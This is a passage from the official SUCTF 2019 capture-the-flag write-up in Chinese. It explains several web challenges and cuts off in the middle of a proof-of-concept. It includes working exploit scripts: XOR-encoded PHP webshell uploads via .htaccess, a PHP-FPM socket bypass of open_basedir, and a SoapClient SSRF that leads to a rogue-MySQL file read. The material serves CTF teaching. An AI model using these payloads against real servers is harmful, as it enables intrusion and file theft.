<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SUCTF 2019 官方 Write up - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="以下是我们 SU 本次 SUCTF的 官方writeup。"><meta property="og:type" content="blog"><meta property="og:title" content="SUCTF 2019 官方 Write up"><meta property="og:url" content="https://team-su.github.io/posts/50499.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="以下是我们 SU 本次 SUCTF的 官方writeup。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190819104652.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_798e53bdb308c936d6e7c008f3bc58ba.png"><meta property="og:image" content="https://hackmd.summershrimp.com/uploads/upload_669e9245c3c4e870eca0ea89ccf2718a.png"><meta property="article:published_time" content="2019-08-21T16:00:00.000Z"><meta property="article:modified_time" content="2025-07-13T10:34:37.199Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="SUCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190819104652.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/50499.html"},"headline":"SUCTF 2019 官方 Write up","image":["https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190819104652.png","https://hackmd.summershrimp.com/uploads/upload_798e53bdb308c936d6e7c008f3bc58ba.png","https://hackmd.summershrimp.com/uploads/upload_669e9245c3c4e870eca0ea89ccf2718a.png"],"datePublished":"2019-08-21T16:00:00.000Z","dateModified":"2025-07-13T10:34:37.199Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"以下是我们 SU 本次 SUCTF的 官方writeup。"}</script><link rel="canonical" href="https://team-su.github.io/posts/50499.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-08-21T16:00:00.000Z" title="2019/8/22 00:00:00">2019-08-22</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T10:34:37.199Z" title="2025/7/13 18:34:37">2025-07-13</time></span><span class="level-item">an hour read (About 9030 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">SUCTF 2019 官方 Write up</h1><div class="content"><p>以下是我们 SU 本次 SUCTF的 官方writeup。</p>
<span id="more"></span>

<hr>
<p>以下是我们 SU 本次 SUCTF的 官方writeup。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#checkin">CheckIn</a></li>
<li><a href="#easyphp">EasyPHP</a><ul>
<li><a href="#di-yi-ceng">第一层</a></li>
<li><a href="#di-er-ceng">第二层</a></li>
<li><a href="#di-san-ceng">第三层</a></li>
<li><a href="#exp">EXP</a><ul>
<li><a href="#exp1-py">exp1.py</a></li>
<li><a href="#exp2-py">exp2.py</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#pythonginx">pythonginx</a></li>
<li><a href="#upload-labs-2">Upload Labs 2</a></li>
<li><a href="#easy-sql">easy_sql</a></li>
<li><a href="#icloudmusic">iCloudMusic</a></li>
<li><a href="#cocktail-s-remix">Cocktail’s Remix</a></li>
</ul>
<ul>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#playfmt">playfmt</a></li>
<li><a href="#babystack">BabyStack</a></li>
<li><a href="#old-pc">old_pc</a><br>+ <a href="#exp-from-ren-ren-ren">exp from 人人人</a><br>+ <a href="#exp-from-kirin">exp from Kirin</a><br>+ <a href="#exp-from-7o8v">exp from 7o8v</a></li>
<li><a href="#sudrv">sudrv</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#qian-dao-ti">签到题</a></li>
<li><a href="#game">game</a></li>
<li><a href="#guess-game">guess_game</a></li>
<li><a href="#homerouter">homerouter</a></li>
<li><a href="#protocol">protocol</a></li>
</ul>
</li>
<li><a href="#rev">Rev</a><ul>
<li><a href="#hardcpp">hardCpp</a></li>
<li><a href="#rev">rev</a></li>
<li><a href="#akira-homework">Akira Homework</a></li>
<li><a href="#signin">SignIn</a></li>
<li><a href="#babyunic">babyunic</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h3><span id="checkin">CheckIn</span><a href="#checkin" class="header-anchor"></a></h3><p>一个比较老的上传技巧,但是貌似很少人知道，一些上传总结中都没有出现，github 开源项目 upload-lab 上也没有出现过，所以就拿来出题了。<code>.user.ini</code>适用于 php-fpm 的场景下的上传 trick，但是CTF比赛中貌似都还没有出现过，直接拿了国赛华东北赛区的一个上传绕过题目来改的，原本是直接 ban 掉了<code>htaccess</code>，防止大家思路跑偏，可是出题人打字太快了写成了<code>htacess</code>，就比较尴尬了。</p>
<p>参考<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">user.ini文件构成的PHP后门</a></p>
<h3><span id="easyphp">EasyPHP</span><a href="#easyphp" class="header-anchor"></a></h3><p>这道题没有什么全新的考点，就是三层绕过，但是第三层 fpm 绕过 disable_functions  ，作为出题人要给大家谢罪了。。。忘记过滤了 ini_set ，结果导致大家都用的时 <a href="https://xz.aliyun.com/t/4720">bypass open_basedir的新方法</a> 这篇文章中的思路。另外还有 putenv，所以第三层基本上是废了 T_T。</p>
<h4><span id="di-yi-ceng">第一层</span><a href="#di-yi-ceng" class="header-anchor"></a></h4><p>黑名单执行，参考自 <a href="https://xz.aliyun.com/t/5677">https://xz.aliyun.com/t/5677</a> ，另外限制了长度。</p>
<p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着。</p>
<p>Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当于取反，可以绕过被过滤的取反符号。</p>
<p>可以传入phpinfo，也可以进入第二层get_the_flag 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag</span><br></pre></td></tr></table></figure>

<h4><span id="di-er-ceng">第二层</span><a href="#di-er-ceng" class="header-anchor"></a></h4><p>.htaccess文件上传，也算是屡见不鲜了</p>
<p>上传的 .htaccess文件可以为如下，我上传的文件是 zenis.pxp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application/x-httpd-php .pxp</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=zenis.pxp&quot;</span><br></pre></td></tr></table></figure>

<p>后面上传的文件可以加一个四个字符 b”\x18\x81\x7c\xf5”，这样base64之后开头就是 GIF89了</p>
<h4><span id="di-san-ceng">第三层</span><a href="#di-san-ceng" class="header-anchor"></a></h4><p>  有了webshell后，发现有 open_basedir限制，在www目录下发现文件 F1AghhhhhhhhhhhhhHH ，但是发现是个假的 flag ，还提示说有 php7.2-fpm has been initialized in unix socket mode!</p>
<p>这里不难联想到 fpm 绕过 open_basedir，disable_functions等限制，参考<a href="https://bugs.php.net/bug.php?id=70134">open_basedir bypass with IP-based PHP-FPM</a>，今年不止考了一次了</p>
<p>php7.2-fpm.sock默认在</p>
<p>unix:&#x2F;&#x2F;&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock</p>
<p>借用p神的脚本魔改一下，不过还要加上对 open_basedir 的重设</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;+chr(0x0A)+&#x27;open_basedir = /&#x27;,</span><br></pre></td></tr></table></figure>

<h4><span id="exp">EXP</span><a href="#exp" class="header-anchor"></a></h4><h5><span id="exp1-py">exp1.py</span><a href="#exp1-py" class="header-anchor"></a></h5><p>改自 p 神的payload，这里贴出关键部分，可以生成base64版，以 GIF89a 开头的payload，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;):</span><br><span class="line">        #if not self.__connect():</span><br><span class="line">        #    print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)</span><br><span class="line">        #    return</span><br><span class="line">......</span><br><span class="line">        #print(request)</span><br><span class="line">        #print(base64.b64encode(request))</span><br><span class="line">        pay = &quot;&lt;?php \n$exp = \&quot;&quot;+base64.b64encode(request).decode()+&quot;\&quot;;&quot; </span><br><span class="line">        pay = pay + &quot;&quot;&quot;</span><br><span class="line">    print_r($exp);</span><br><span class="line">    $sock=stream_socket_client(&#x27;unix:///run/php/php7.2-fpm.sock&#x27;);</span><br><span class="line">    stream_socket_sendto($sock, base64_decode($exp));</span><br><span class="line">    print(&quot;\n&quot;);</span><br><span class="line">    while(!feof($sock))&#123;</span><br><span class="line">        print_r(fread($sock, 4096));</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($sock);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">        print(base64.b64encode(b&quot;\x18\x81\x7c\xf5&quot;+pay.encode()))            </span><br><span class="line">        exit()</span><br><span class="line">......</span><br><span class="line">        &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content),</span><br><span class="line">        &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;+chr(0x0A)+&#x27;open_basedir = /&#x27;,</span><br><span class="line">        &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5><span id="exp2-py">exp2.py</span><a href="#exp2-py" class="header-anchor"></a></h5><p>将 exp.py 生成的 payload 放到 exp 变量即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.188.128:8810/&quot;</span><br><span class="line">payload = &quot;?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span><br><span class="line">files = &#123;&#x27;file&#x27;:(&quot;.htaccess&quot;,&quot;&quot;&quot;#define width 1</span><br><span class="line">#define height 1</span><br><span class="line">AddType application/x-httpd-php .pxp</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=zenis.pxp&quot;&quot;&quot;)&#125;</span><br><span class="line">r1 = requests.post(url+payload, files=files)</span><br><span class="line">#print(r1.text)</span><br><span class="line">exp = &quot;&quot;&quot;GIF89Tw/cGhwIAokZXhwID0gIkFRRjZPQUFJQUFBQUFRQUFBQUFBQUFFRWVqZ0I3QUFBRVF0SFFWUkZWMEZaWDBsT1ZFVlNSa0ZEUlVaaGMzUkRSMGt2TVM0d0RnUlNSVkZWUlZOVVgwMUZWRWhQUkZCUFUxUVBGMU5EVWtsUVZGOUdTVXhGVGtGTlJTOTJZWEl2ZDNkM0wyaDBiV3d2YVc1a1pYZ3VjR2h3Q3hkVFExSkpVRlJmVGtGTlJTOTJZWEl2ZDNkM0wyaDBiV3d2YVc1a1pYZ3VjR2h3REFCUlZVVlNXVjlUVkZKSlRrY0xGMUpGVVZWRlUxUmZWVkpKTDNaaGNpOTNkM2N2YUhSdGJDOXBibVJsZUM1d2FIQU5BVVJQUTFWTlJVNVVYMUpQVDFRdkR3NVRSVkpXUlZKZlUwOUdWRmRCVWtWd2FIQXZabU5uYVdOc2FXVnVkQXNKVWtWTlQxUkZYMEZFUkZJeE1qY3VNQzR3TGpFTEJGSkZUVTlVUlY5UVQxSlVPVGs0TlFzSlUwVlNWa1ZTWDBGRVJGSXhNamN1TUM0d0xqRUxBbE5GVWxaRlVsOVFUMUpVT0RBTENWTkZVbFpGVWw5T1FVMUZiRzlqWVd4b2IzTjBEd2hUUlZKV1JWSmZVRkpQVkU5RFQweElWRlJRTHpFdU1Rd1FRMDlPVkVWT1ZGOVVXVkJGWVhCd2JHbGpZWFJwYjI0dmRHVjRkQTRDUTA5T1ZFVk9WRjlNUlU1SFZFZzBNZ2t3VUVoUVgxWkJURlZGWVhWMGIxOXdjbVZ3Wlc1a1gyWnBiR1VnUFNCd2FIQTZMeTlwYm5CMWRBcHZjR1Z1WDJKaGMyVmthWElnUFNBdkR4WlFTRkJmUVVSTlNVNWZWa0ZNVlVWaGJHeHZkMTkxY214ZmFXNWpiSFZrWlNBOUlFOXVBUVI2T0FBQUFBQUJCWG80QUNvQUFEdy9jR2h3SUhCeWFXNTBYM0lvYzJOaGJtUnBjaWduTDNaaGNpOTNkM2N2YUhSdGJDY3BLVHMvUGdFRmVqZ0FBQUFBIjsKICAgIHByaW50X3IoJGV4cCk7CiAgICAkc29jaz1zdHJlYW1fc29ja2V0X2NsaWVudCgndW5peDovLy9ydW4vcGhwL3BocDcuMi1mcG0uc29jaycpOwogICAgc3RyZWFtX3NvY2tldF9zZW5kdG8oJHNvY2ssIGJhc2U2NF9kZWNvZGUoJGV4cCkpOwogICAgcHJpbnQoIgoiKTsKICAgIHdoaWxlKCFmZW9mKCRzb2NrKSl7CiAgICAgICAgcHJpbnRfcihmcmVhZCgkc29jaywgNDA5NikpOwogICAgfQogICAgZmNsb3NlKCRzb2NrKTsK&quot;&quot;&quot;</span><br><span class="line">files = &#123;&#x27;file&#x27;:(&quot;zenis.pxp&quot;,exp)&#125;</span><br><span class="line">r2 = requests.post(url+payload, files=files)</span><br><span class="line">print(r2.text)</span><br><span class="line">print(requests.get(url+r2.text).text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<h3><span id="pythonginx">pythonginx</span><a href="#pythonginx" class="header-anchor"></a></h3><p>这是在刚刚举行的 black hat 2019 上看到的东西，感觉比较有意思，就拿来出题了。</p>
<p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190819104652.png"></p>
<p>&#x2F;&#x2F;题目代码都没改多少，但是很多队伍都跑远了…orz</p>
<p>预期解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr%2ffffffflag @111</span><br></pre></td></tr></table></figure>
<p>这里我选用的是<code>℆</code>这个字符，再加上题目给的 nginx 提示，其实按照预期思路基本没有什么坑，就比较容易让人想到<code>/usr/local/nginx/conf/nginx.conf</code>这个 nginx 配置文件了，里面就有 flag 的位置。</p>
<p>看了很多师傅的非预期，感觉也挺有意思的，但是按照其他的思路来看这题就成了一道猜 flag 位置的题。（给师傅们磕头了，哐哐哐，是我太菜了…</p>
<p>问了一些师傅，都表示看了这篇文章，&#x2F;&#x2F;vk师傅又读了一遍urllib的源码orz</p>
<p>其实html的提示就是想说 suctf.cc 是绑了 localhost ，大家可以不用管这个域名。</p>
<p>题外话，还有师傅真的把 suctf.cc 给买下来了…还买了一年 orz…然后还真有一个师傅跑偏到日 suctf.cc 去了…</p>
<p>哐哐哐给师傅们谢罪了</p>
<h3><span id="upload-labs-2">Upload Labs 2</span><a href="#upload-labs-2" class="header-anchor"></a></h3><p>题目直接给出了附件，代码不多，简单审计我们可以知道要<code>getFlag</code>就需要绕过<code>127.0.0.1</code>的限制，首先我们来看怎么绕过<code>127.0.0.1</code>的限制。<br>在<code>class.php</code>中，我们可以很明显的看到存在</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable language_">$this</span>-&gt;func);</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$class</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>(<span class="variable">$this</span>-&gt;file_name);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打ctf比较多的人可能会很熟悉，这是可以通过反射<code>SimpleXMLElement</code>来进行xxe，但是题目在 config.php 中把外部实体给限制了。<br>但是从<code>$a-&gt;check();</code>的调用我们不难想到可以利用<code>SoapClient</code>来进行 SSRF ,利用条件就是要通过反序列化，那么怎么得到反序列化呢<br>这个题考的就是<code>finfo_file</code>触发 phar 反序列化，但是题目有以下限制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Go away!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ban 掉了 phar 开头的伪协议，还有一些考过的协议，发现还有 php 伪协议没有 ban ，于是可以利用类似于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://./1.phar</span><br></pre></td></tr></table></figure>
<p>这种形式来触发反序列化，所以基本外层都弄完了，下面看看内部怎么弄。</p>
<p>题目在 admin.php 中又给了一个反序列化，这个反序列化我们可以看到只能通过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$admin</span> = <span class="keyword">new</span> <span class="title class_">Ad</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$clazz</span>, <span class="variable">$func1</span>, <span class="variable">$func2</span>, <span class="variable">$func3</span>, <span class="variable">$arg1</span>, <span class="variable">$arg2</span>, <span class="variable">$arg3</span>);</span><br><span class="line"><span class="variable">$admin</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br></pre></td></tr></table></figure>
<p>这样去触发了，又给了另几个反射类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$reflect</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable language_">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;instance = <span class="variable">$reflect</span>-&gt;<span class="title function_ invoke__">newInstanceArgs</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func1);</span><br><span class="line">    <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func2);</span><br><span class="line">    <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> <span class="title class_">ReflectionMethod</span>(<span class="variable language_">$this</span>-&gt;clazz, <span class="variable language_">$this</span>-&gt;func3);</span><br><span class="line">    <span class="variable">$reflectionMethod</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="variable">$this</span>-&gt;instance, <span class="variable">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考<a href="https://paper.seebug.org/998/">TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain</a>，这里其实就是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>();</span><br><span class="line"><span class="variable">$m</span>-&gt;<span class="title function_ invoke__">init</span>();</span><br><span class="line"><span class="variable">$m</span>-&gt;<span class="title function_ invoke__">real_connect</span>(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="string">&#x27;select 1&#x27;</span>,<span class="number">3306</span>);</span><br><span class="line"><span class="variable">$m</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select 1;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>在自己服务器上架一个 rogue mysql 就行了，然后文件参数为<code>phar://./upload/xxxx</code>，你上传的那个 phar 就行了，然后就可以在自己传入的那个端口拿到 flag 啦。</p>
<p>POC:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$type</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;SoapClient&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file_name = <span class="variable">$file_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/admin.php&#x27;</span>;</span><br><span class="line"><span class="comment">// $target = &quot;http://106.14.153.173:2015&quot;;</span></span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;admin=1&amp;clazz=Mysqli&amp;func1=init&amp;arg1=&amp;func2=real_connect&amp;arg2[0]=xxx.xxx.xxx.xxx&amp;arg2[1]=root&amp;arg2[2]=123&amp;arg2[3]=test&amp;arg2[4]=3306&amp;func3=query&amp;arg3=select%201&amp;ip=xxx.xxx.xxx.xxx&amp;port=xxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"><span class="comment">// $b = new SoapClient(null,array(&quot;location&quot; =&gt; $target,&quot;user_agent&quot;=&gt;&quot;zedd\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;.join(&quot;\r\n&quot;,$headers).&quot;\r\nContent-Length: &quot;.(string)strlen($post_string).&quot;\r\n\r\n&quot;.$post_string,&quot;uri&quot;      =&gt; &quot;aaab&quot;));</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&quot;location&quot;</span> =&gt; <span 